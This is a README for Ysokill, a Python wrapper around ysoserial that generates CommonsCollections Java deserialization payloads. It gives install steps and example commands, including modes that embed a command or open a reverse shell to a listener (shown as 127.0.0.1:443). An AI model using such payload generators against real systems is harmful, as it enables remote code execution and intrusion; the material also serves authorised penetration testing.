<h1 align="center">
<br>☕ Ysokill ☕
</h1>

<!-- ABOUT THE PROJECT -->
## 📚 About The Project


   Ysokill is a python script for generate all CommonsCollections payload's using the ysoserial.

![image](https://user-images.githubusercontent.com/80011252/195660401-b066c1dd-718f-4f0a-9c57-d9ee4f4fd44e.png)

### 🛠️ Installation


1. Clone the repo
   ```sh
   git clone https://github.com/scarmandef/ysokill.git
   ```
2. Install dependencies
   ```sh
   pip3 install -r requirements.txt
   ```
3. Run the script
   ```py
   python3 main.py
   ```

### 🖥️ Usage


1. Run the Script
   ```sh
   python3 main.py --help
   ```
2. Choose the mode
   ```sh
      1 - Object Command "H4sIAAAA"
      2 - Object Reverse Shell "H4sIAAAA"
      3 - Object Command "rO0ABXNy"
      4 - Object Reverse Shell "rO0ABXNy"
      5 - Binary Command
      6 - Binary Reverse Shell
   ```
3. Example: Modes 1 to 3
   ```py
   python3 main.py -m 1 -c 'curl https://127.0.0.1'
   ```
4. Example: Modes 3 to 4
   ```py
   python3 main.py -m 4 -l 127.0.0.1 -p 443
   ```
